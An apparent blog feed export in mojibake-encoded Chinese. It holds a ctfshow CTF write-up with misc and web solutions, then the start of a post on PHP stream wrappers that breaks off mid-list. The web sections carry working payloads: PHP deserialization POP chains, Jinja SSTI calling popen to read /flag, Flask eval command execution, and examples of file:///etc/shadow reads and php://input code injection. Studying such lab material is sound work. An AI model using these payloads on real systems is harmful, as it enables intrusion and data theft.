    <content><![CDATA[<h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>hintå¦‚ä¸‹:</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042119063.png" alt="image-20230404211906983"></p>
<p>æ²¡æƒ³åˆ°ä»–flagç›´æ¥å°±æ˜¯ä¸­æ–‡â€ä¸€ä¸ªä¸èƒ½è¯´çš„ç§˜å¯†â€ï¼Œæ¶¨è§è¯†äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;ä¸€ä¸ªä¸èƒ½è¯´çš„ç§˜å¯†&#125;</span><br></pre></td></tr></table></figure>

<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="å¥‡æ€ªçš„å‹ç¼©åŒ…"><a href="#å¥‡æ€ªçš„å‹ç¼©åŒ…" class="headerlink" title="å¥‡æ€ªçš„å‹ç¼©åŒ…"></a>å¥‡æ€ªçš„å‹ç¼©åŒ…</h3><p>ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…ï¼ŒæŒ‰ç…§æƒ¯ä¾‹å…ˆè¯•è¯•æ˜¯ä¸æ˜¯ä¼ªåŠ å¯†</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042122149.png" alt="image-20230404212240131"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042123133.png" alt="image-20230404212308114"></p>
<p>è¿™ä¸¤ä¸ªä½ç½®éƒ½æ¢æˆ00 00ï¼Œä¿å­˜æ‰“å¼€å¾—åˆ°black.png</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042124771.png" alt="image-20230404212400755"></p>
<p>æ˜¾ç¤ºäº†åŠæˆªï¼Œå…ˆçŒœæµ‹é«˜åº¦éšå†™</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042126761.png" alt="image-20230404212648742"></p>
<p>æŠŠç¬¬äºŒæ®µçš„96æ”¹æˆç­‰é«˜åº¦384è¯•è¯•</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042127702.png" alt="image-20230404212730674"></p>
<p>å¾—åˆ°å…¨æ–‡ï¼Œä½†æ˜¯è¿˜æ˜¯å¾—binwalkçœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰è—æ¯”</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042354105.png" alt="image-20230404235003535"></p>
<p>æœ‰è—æ¯”ï¼Œç”¨foremoståˆ†ç¦»ä¸€ä¸‹å¾—åˆ°ä¸€ä¸ªpngå’Œzipæ–‡ä»¶</p>
<p>å…¶å®åœ¨black.pngæœ€åè¾¹æœ‰æç¤ºkeyï¼Œbase64ä¹‹åå°±æ˜¯â€œyurenjieâ€ï¼Œè¿™æ˜¯å‹ç¼©å¯†ç </p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042354312.png" alt="image-20230404235153184"></p>
<p>å¾—åˆ°flag.pngï¼Œè¿˜æ˜¯é«˜åº¦éšå†™ï¼Œä¿®æ”¹ä¹‹åå°±èƒ½å¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042354502.png" alt="image-20230404235248682"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;Th1s_i5_f1ag&#125;</span><br></pre></td></tr></table></figure>

<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h3><p>æ˜¯ä¸ªbase64ç¼–ç ä¹‹åä¼ å€¼åˆ°imgæ˜¾ç¤ºå›¾ç‰‡</p>
<p>æŠŠindex.php base64åä¼ è¿›å»å¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042357547.png" alt="image-20230404235735530"></p>
<p>è§£ç å¾—åˆ°å†…å®¹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042358391.png" alt="image-20230404235801368"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;eff420e3-947e-4c4b-816a-ed8810990daf&#125;</span><br></pre></td></tr></table></figure>

<h3 id="è¢«é—å¿˜çš„ååºåˆ—åŒ–"><a href="#è¢«é—å¿˜çš„ååºåˆ—åŒ–" class="headerlink" title="è¢«é—å¿˜çš„ååºåˆ—åŒ–"></a>è¢«é—å¿˜çš„ååºåˆ—åŒ–</h3><p>è¿™é¢˜è§£æ³•å¤ªå¤šäº†ï¼Œèƒ½ç”¨phpåŸç”Ÿç±»åšï¼Œå­¦é•¿ä¸¤æ­¥å°±ç›´æ¥åšå‡ºæ¥äº†ï¼Œæ ¹æœ¬æ²¡ç”¨åˆ°åŠ å¯†å‡½æ•°</p>
<h4 id="æ³•ä¸€"><a href="#æ³•ä¸€" class="headerlink" title="æ³•ä¸€"></a>æ³•ä¸€</h4><p>æˆ‘çš„æ­¥éª¤è¿˜æ˜¯æœ‰ç‚¹ç¹ç</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"># å½“å‰ç›®å½•ä¸­æœ‰ä¸€ä¸ªtxtæ–‡ä»¶å“¦</span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include(&quot;check.php&quot;);</span><br><span class="line"></span><br><span class="line">class EeE&#123;</span><br><span class="line">    public $text;</span><br><span class="line">    public $eeee;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if ($this-&gt;text == &quot;aaaa&quot;)&#123;</span><br><span class="line">            echo lcfirst($this-&gt;text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($kk)&#123;</span><br><span class="line">        echo &quot;$kk,eeeeeeeeeeeee&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __clone()&#123;</span><br><span class="line">        $a = new cycycycy;</span><br><span class="line">        $a -&gt; aaa();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class cycycycy&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    private $b;</span><br><span class="line"></span><br><span class="line">    public function aaa()&#123;</span><br><span class="line">        $get = $_GET[&#x27;get&#x27;];</span><br><span class="line">        $get = cipher($get);</span><br><span class="line">        if($get === &quot;p8vfuv8g8v8py&quot;)&#123;</span><br><span class="line">            eval($_POST[&quot;eval&quot;]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $a_a = $this -&gt; a;</span><br><span class="line">        echo &quot;\$a_a\$&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class gBoBg&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $file;</span><br><span class="line">    public $coos;</span><br><span class="line">    private $eeee=&quot;-_-&quot;;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        if(isset($this-&gt;name))&#123;</span><br><span class="line">            $a = new $this-&gt;coos($this-&gt;file);</span><br><span class="line">            echo $a;</span><br><span class="line">        &#125;else if(!isset($this -&gt; file))&#123;</span><br><span class="line">            return $this-&gt;coos-&gt;name;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $aa = $this-&gt;coos;</span><br><span class="line">            $bb = $this-&gt;file;</span><br><span class="line">            return $aa();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line">class w_wuw_w&#123;</span><br><span class="line">    public $aaa;</span><br><span class="line">    public $key;</span><br><span class="line">    public $file;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(!preg_match(&quot;/php|63|\*|\?/i&quot;,$this -&gt; key))&#123;</span><br><span class="line">            $this-&gt;key = file_get_contents($this -&gt; file);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;ä¸è¡Œå“¦&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;aaa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this -&gt; aaa = clone new EeE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_ip = $_SERVER[&quot;HTTP_AAAAAA&quot;];</span><br><span class="line">unserialize($_ip);</span><br></pre></td></tr></table></figure>

<p>å°±å››ä¸ªç±»ï¼Œè¿˜æ˜¯å¾ˆå¥½åšçš„</p>
<p>ç”±äºä¸çŸ¥é“å…¶ä¸­cipher()å‡½æ•°çš„åŠ å¯†æ–¹å¼ï¼Œæ‰€ä»¥å¾—å…ˆçœ‹çœ‹åŒ…å«çš„check.phpå†…å®¹æ˜¯ä»€ä¹ˆï¼ˆbydä»–è¯´çš„é‚£ä¸ªtxtæ ¹æœ¬æ‰«ä¸å‡ºæ¥ï¼Œè¿˜æ˜¯æˆ‘æœ€ååšå®Œæ‰ç¿»çš„ç›®å½•æ˜¯h1nt.txtğŸ’§ï¼‰</p>
<p>åœ¨w_wuw_wç±»ä¸­æœ‰file_get_contents()å‡½æ•°å¯ä»¥æ–¹ä¾¿çš„æŠŠ$fileå¤–å¸¦å‡ºæ¥ï¼Œä½†æ˜¯ä»–åªåœ¨destructçš„æ—¶å€™echoå‡º$aaaï¼Œæ‰€ä»¥å°±è¦ç”¨åˆ°ä¹‹å‰ç‹—å­¦é•¿è¯´è¿‡çš„å¼•ç”¨&amp;èµ‹å€¼</p>
<p>è®©$aaa &#x3D; &amp;$fileï¼Œä½¿å¾—è¿™ä¸¤ä¸ªå˜é‡æŒ‡å‘ç›¸åŒåœ°å€ï¼Œè¿™æ ·ä¸¤ä¸ªå˜é‡çš„å†…å®¹å°±ä¼šåŒæ—¶æ”¹å˜</p>
<p>æ„é€ å‡ºpayloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$w_wuw_w = new w_wuw_w();</span><br><span class="line">$w_wuw_w -&gt; key = &#x27;test&#x27;;</span><br><span class="line">$w_wuw_w -&gt; file = &#x27;check.php&#x27;;</span><br><span class="line">$w_wuw_w -&gt; aaa = &amp;$w_wuw_w -&gt; key;</span><br><span class="line">O:7:&quot;w_wuw_w&quot;:4:&#123;s:3:&quot;aaa&quot;;N;s:3:&quot;key&quot;;s:4:&quot;test&quot;;s:4:&quot;file&quot;;s:9:&quot;check.php&quot;;s:0:&quot;&quot;;R:3;&#125;</span><br></pre></td></tr></table></figure>

<p>å¤–å¸¦å‡ºcheck.phpçš„å†…å®¹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050012246.png" alt="image-20230405001238222"></p>
<p>ç•¥åŠ ä¿®æ”¹ä¸€ä¸‹å°±å¾—åˆ°äº†å…·ä½“çš„å†…å®¹ï¼Œåˆ†æä¸€ä¸‹èƒ½å†™å‡ºè§£å¯†è„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def decrypt_string(input_string):</span><br><span class="line">    charset = &quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;</span><br><span class="line">    shift = 4</span><br><span class="line">    shifted = &quot;&quot;</span><br><span class="line">    for char in input_string:</span><br><span class="line">        pos = charset.find(char)</span><br><span class="line">        if pos != -1:</span><br><span class="line">            new_pos = (pos + shift + len(charset)) % len(charset)</span><br><span class="line">            shifted += charset[new_pos]</span><br><span class="line">        else:</span><br><span class="line">            shifted += char</span><br><span class="line">    return shifted</span><br><span class="line">print(decrypt_string(&#x27;p8vfuv8g8v8py&#x27;))</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°åŸæœ¬getè¯¥ä¼ å…¥çš„å€¼ï¼šfe1ka1ele1efp</p>
<p>ç”±w_wuw_wçš„echoå‡½æ•°åˆå¯ä»¥è°ƒç”¨__toStringï¼Œæ€»ç»“ä¸€ä¸‹å¾—åˆ°popé“¾</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">w_wuw_w::__destruct() -&gt; gBoBg::__toString() -&gt; w_wuw_w::__invoke() -&gt; EeE::__clone() -&gt; cycycycy::aaa()</span><br><span class="line">O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;N;s:4:&quot;file&quot;;s:4:&quot;test&quot;;s:4:&quot;coos&quot;;O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;N;s:3:&quot;key&quot;;s:2:&quot;63&quot;;s:4:&quot;file&quot;;N;&#125;&#125;s:3:&quot;key&quot;;s:2:&quot;63&quot;;s:4:&quot;file&quot;;s:9:&quot;check.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>åŒæ—¶ä¼ å…¥?get&#x3D;fe1ka1ele1efp;eval&#x3D;system(â€˜ls &#x2F;â€˜);</p>
<p>å°±å¯å¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050016174.png" alt="image-20230405001615152"></p>
<p>catä¸€ä¸‹å°±è¡Œ</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050016060.png" alt="image-20230405001637044"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;be571200-b78b-4bfe-ba08-71787e58acb6&#125;</span><br></pre></td></tr></table></figure>

<h4 id="æ³•äºŒ"><a href="#æ³•äºŒ" class="headerlink" title="æ³•äºŒ"></a>æ³•äºŒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=new w_wuw_w();</span><br><span class="line">$b=new gBoBg();</span><br><span class="line">$a-&gt;aaa=$b;</span><br><span class="line">$b-&gt;name=123;</span><br><span class="line">$b-&gt;coos=&quot;SplFileObject&quot;;</span><br><span class="line">$b-&gt;file=&quot;php://filter/convert.base64-encode/resource=/flag&quot;;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>

<p>åŠ è¯·æ±‚å¤´</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AAAAAA:O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;i:123;s:4:&quot;file&quot;;s:11:&quot;glob:///*f*&quot;;s:4:&quot;coos&quot;;s:17:&quot;DirectoryIterator&quot;;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;</span><br><span class="line">#å¾—åˆ°æ–‡ä»¶åï¼šf1agaaa</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AAAAAA:O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;i:123;s:4:&quot;file&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=/f1agaaa&quot;;s:4:&quot;coos&quot;;s:13:&quot;SplFileObject&quot;;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>ç”¨çš„æ˜¯phpåŸç”Ÿç±»ï¼Œglobç›´æ¥æŸ¥flagï¼ŒSplFileObjectæŸ¥flagï¼Œå¤ªå¿«äº†</p>
<h3 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h3><h4 id="æ³•ä¸€-1"><a href="#æ³•ä¸€-1" class="headerlink" title="æ³•ä¸€"></a>æ³•ä¸€</h4><p>æç¤º</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050025322.png" alt="image-20230405002511299"></p>
<p>æ‰“å¼€çœ‹åˆ°æ˜¯å¸¸è§çš„ssti</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050025174.png" alt="image-20230405002546148"></p>
<p>ç”¨hackbarçš„sstiæ¢å‡ ä¸ªè¯•è¯•ï¼Œæ‰¾åˆ°app.pyçš„æºç </p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050028102.png" alt="image-20230405002846077"></p>
<p>å¾ˆæ˜æ˜¾ï¼Œè¦æ±‚è¿‡æ»¤äº†få’Œ&#x2F;ï¼Œä½†æ˜¯å¦‚æœé‡Œè¾¹æœ‰geå°±å¯ä»¥æ­£å¸¸è§£æ</p>
<p>ç”±äºè¦å…ˆå‡ºç°geï¼Œé‚£å°±æ„é€ shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ge=&quot;test&quot;;cd ..;cat flag</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050036618.png" alt="image-20230405003607596"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;1fe332f3-a27d-44f2-b864-2416b80c021e&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶å®æ‰«ç½‘çš„æ—¶å€™æœ‰consoleç›®å½•ï¼Œä¹Ÿå¯ä»¥é€šè¿‡sstiå¾—åˆ°æœºå™¨ä¿¡æ¯ç®—å‡ºpinç ç›´æ¥æ‰§è¡Œpythonå‘½ä»¤ï¼Œä¸è¿‡æ›´å¤æ‚äº†</p>
<h4 id="æ³•äºŒ-1"><a href="#æ³•äºŒ-1" class="headerlink" title="æ³•äºŒ"></a>æ³•äºŒ</h4><p>ç›¸ä¼¼ï¼Œåªä¸è¿‡ç‹—å­¦é•¿ç”¨çš„catå‘½ä»¤æ›´å·§å¦™ï¼Œæ²¡æœ‰æ„é€ ge</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat $&#123;PATH:0:1&#125;[9-q][9-q][9-q][9-q]</span><br></pre></td></tr></table></figure>

<p>ç”¨${PATH:0:1}ä»£æ›¿&#x2F;ï¼Œæ­£åˆ™[9-q]åŒ¹é…flagå››ä¸ªå­—æ¯</p>
<h4 id="æ³•ä¸‰"><a href="#æ³•ä¸‰" class="headerlink" title="æ³•ä¸‰"></a>æ³•ä¸‰</h4><p>å®˜æ–¹ç»™çš„é¢˜è§£</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/hello/&#123;&#123; &quot;&quot;.__class__.__base__ .__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](request.args.get(&quot;ctfshow&quot;)).read()&#125;&#125;ge?ctfshow=cat /flag </span><br></pre></td></tr></table></figure>

<h3 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h3><p>æ‰“å¼€æ˜¯ä¸ªç™»é™†é¡µé¢ï¼Œç”¨sqlmapä¹Ÿçˆ†ä¸å‡ºæ¥ï¼Œå°±å°è¯•ç›´æ¥æ³¨å†Œç™»é™†çœ‹çœ‹å†…å®¹</p>
<p>ç™»é™†è¿›å»æç¤ºæˆ‘çš„è§’è‰²æ˜¯userï¼Œå½“è§’è‰²æ˜¯adminçš„æ—¶å€™ä¼šç»™å‡ºä¸œè¥¿</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051204342.png" alt="image-20230405120423293"></p>
<p>å†çœ‹çœ‹learnçš„å†…å®¹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051206785.png" alt="image-20230405120609765"></p>
<p>ç»™å‡ºäº†app.secret_key &#x3D; â€˜S3cr3tK3yâ€™ï¼Œåœ¨burpé‡Œåˆèƒ½çœ‹åˆ°cookieå†…å®¹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051206709.png" alt="image-20230405120639690"></p>
<p>base64è§£ç å‡ºæ¥å°±èƒ½çœ‹åˆ°ä¿¡æ¯</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051207045.png" alt="image-20230405120713026"></p>
<p>æ‰€ä»¥å°±ç”¨å·¥å…·ä¼ªé€ ä¸€ä¸‹session</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051210297.png" alt="image-20230405121020273"></p>
<p>åŠ å¯†åç”¨burpä¼ è¿›å»å°±æœ‰ä»»æ„æ–‡ä»¶ä¸‹è½½çš„åŠŸèƒ½</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051211084.png" alt="image-20230405121111065"></p>
<p>çœ‹ä¸€ä¸‹app.pyæ˜¯æ€ä¹ˆå†™çš„</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051216349.png" alt="image-20230405121604328"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051216781.png" alt="image-20230405121621759"></p>
<p>åˆ†åˆ«ç»™å‡ºäº†adminçš„å¯†ç å’Œä¸€ä¸ªhelloè·¯å¾„ï¼Œæœ‰evalåˆ©ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?eval=__import__(&#x27;os&#x27;).system(&#x27;ls / &gt; test&#x27;)</span><br></pre></td></tr></table></figure>

<p>ç„¶åä»»æ„æ–‡ä»¶è¯»å–test</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051225286.png" alt="image-20230405122559265"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?eval=__import__(&#x27;os&#x27;).system(&#x27;cat /flag_is_h3re &gt; test&#x27;)</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…æ›´ç›´æ¥ä¸€ç‚¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?eval=__import__(&#x27;os&#x27;).popen(&#x27;cat /*f*&#x27;).read()</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;d7cbfb77-b2fb-47ee-ade9-e78bd40c9871&#125;</span><br></pre></td></tr></table></figure>

<h3 id="easy-base"><a href="#easy-base" class="headerlink" title="easy_base"></a>easy_base</h3><p>ä¸€æŠŠæ¢­è„šæœ¬</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051240312.png" alt="image-20230405124031283"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;yu_ren_j1e_haPpy!!!&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>é¢˜è§£</tag>
        <tag>web</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPä¼ªåè®®</title>
    <url>/2023/10/09/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p>æ”¯æŒçš„åè®®ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</span><br><span class="line">http:// â€” è®¿é—® HTTP(s) ç½‘å€</span><br><span class="line">ftp:// â€” è®¿é—® FTP(s) URLs</span><br><span class="line">php:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰</span><br><span class="line">zlib:// â€” å‹ç¼©æµ</span><br><span class="line">data:// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰</span><br><span class="line">glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</span><br><span class="line">phar:// â€” PHP å½’æ¡£</span><br><span class="line">ssh2:// â€” å®‰å…¨å¤–å£³åè®® 2</span><br><span class="line">rar:// â€” RAR</span><br><span class="line">ogg:// â€” éŸ³é¢‘æµ</span><br><span class="line">expect:// â€” å¤„ç†äº¤äº’å¼çš„æµ</span><br></pre></td></tr></table></figure>

<h1 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h1><p>å¯ä»¥æ­é…fopen()ï¼Œfile_get_contents()ï¼Œinclude()ç­‰å‡½æ•°æ­é…ä½¿ç”¨ï¼Œæ”¯æŒç›¸å¯¹ã€ç»å¯¹å’Œç½‘ç»œè·¯å¾„ã€‚ä½†æ˜¯æˆ‘å®æµ‹ç›¸å¯¹è·¯å¾„ä¸ç”¨file:&#x2F;&#x2F;è¯»å–ï¼Œç›´æ¥è¯»å°±å¯ä»¥äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://./index.php        #ç›¸å¯¹è·¯å¾„è¯»å–æ–‡ä»¶#./index.php</span><br><span class="line">file:///etc/shadow  #ç»å¯¹è·¯å¾„è¯»å–</span><br><span class="line">file://http://127.0.0.1/index.php   #ç½‘ç»œè·¯å¾„è¯»å–</span><br></pre></td></tr></table></figure>

<h1 id="http-x2F-x2F-amp-https-x2F-x2F"><a href="#http-x2F-x2F-amp-https-x2F-x2F" class="headerlink" title="http:&#x2F;&#x2F; &amp; https:&#x2F;&#x2F;"></a>http:&#x2F;&#x2F; &amp; https:&#x2F;&#x2F;</h1><p>é€šè¿‡HTTP 1.0çš„GETæ–¹æ³•è®¿é—®ç½‘ç»œèµ„æº</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$homepage = file_get_contents(&quot;https://www.bilibili.com/&quot;);</span><br><span class="line">echo $homepage;</span><br></pre></td></tr></table></figure>

<h1 id="ftp-x2F-x2F"><a href="#ftp-x2F-x2F" class="headerlink" title="ftp:&#x2F;&#x2F;"></a>ftp:&#x2F;&#x2F;</h1><p>è¿™ä¸ªè¿˜æ²¡å¼„æ‡‚æ€ä¹ˆè¯»ï¼Œå¥½åƒè§çš„ä¹Ÿæ¯”è¾ƒå°‘ï¼Œå…ˆæ”¾æ”¾</p>
<h1 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h1><h2 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h2><p>è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå¯ä»¥ç”¨æ¥æ¥æ”¶postçš„æ•°æ®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$F = $_GET[&#x27;file&#x27;];</span><br><span class="line">include($F);</span><br></pre></td></tr></table></figure>

<p>ä¼ post</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/?file=php://input</span><br><span class="line">POST DATA: &lt;?php echo system(&#x27;ls&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="php-x2F-x2F-output"><a href="#php-x2F-x2F-output" class="headerlink" title="php:&#x2F;&#x2F;output"></a>php:&#x2F;&#x2F;output</h2><p>æ˜¯ä¸€ä¸ªåªå†™çš„æ•°æ®æµï¼Œå¯ä»¥åƒechoä¸€æ ·å†™å…¥åˆ°è¾“å‡ºä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$output = fopen(&quot;php://output&quot;, &quot;w&quot;);</span><br><span class="line">fwrite($output, &quot;test&quot;);</span><br><span class="line">fclose($output);</span><br></pre></td></tr></table></figure>

<h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><p>ç”¨æ³•: php:&#x2F;&#x2F;filter&#x2F;ç­›é€‰è¿‡æ»¤æ–¹å¼&#x2F;resource&#x3D;&lt;æ–‡ä»¶&gt;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$F = &quot;php://filter/read=convert.base64-encode/resource=t.php&quot;;</span><br><span class="line">include($F);</span><br></pre></td></tr></table></figure>

<p>å­—ç¬¦ä¸²è¿‡æ»¤å™¨ï¼š</p>
<ul>
<li><p>string.rot13 # ç­‰åŒäºç”¨ str_rot13()å‡½æ•°,å°†26ä¸ªè‹±æ–‡å­—æ¯çš„å‰é¢13ä¸ªå­—ç¬¦ä¸å13ä¸ªå­—ç¬¦äº’æ¢ (PHP 4.3.0)</p>
</li>
<li><p>string.toupper # ç­‰åŒäºç”¨ strtoupper(),å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™ (PHP 5.0.0)</p>
</li>
<li><p>string.tolower # åŒäºç”¨ strtolower()ï¼Œå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ (PHP 5.0.0)</p>
</li>
<li><p>string.strip_tags # ç­‰åŒäºç”¨ strip_tags(),ä»å­—ç¬¦ä¸²ä¸­å»é™¤htmlå’Œphpæ ‡ç­¾ (PHP 5.0.0)</p>
</li>
</ul>
<p>è½¬æ¢è¿‡æ»¤å™¨ï¼š</p>
<ul>
<li><p>convert.base64-encode</p>
</li>
<li><p>convert.base64-decode</p>
</li>
<li><p>convert.quoted-printable-encode#å°† 8-bit å­—ç¬¦ä¸²è½¬æ¢ä¸ºquoted-printable å­—ç¬¦ä¸²ã€‚</p>
</li>
